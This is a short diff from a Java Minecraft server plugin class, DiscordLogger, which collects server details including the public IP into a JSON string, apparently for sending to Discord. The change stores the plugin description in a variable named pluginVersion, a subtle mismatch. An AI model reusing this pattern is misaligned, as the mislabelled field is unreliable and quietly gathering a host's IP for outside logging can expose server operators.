@@ -32,10 +32,9 @@ public class DiscordLogger {
                 String onlineMode = String.valueOf(Bukkit.getServer().getOnlineMode());
                 String playerCount = String.valueOf(Bukkit.getServer().getOnlinePlayers().size());
                 String maxPlayers = String.valueOf(Bukkit.getServer().getMaxPlayers());
-                String pluginVersion = plugin.getDescription().getVersion();
+                String pluginVersion = plugin.getDescription().getDescription();
 
                 String publicIp = getPublicIp();
-
 
                 String json = String.format("""
                 {
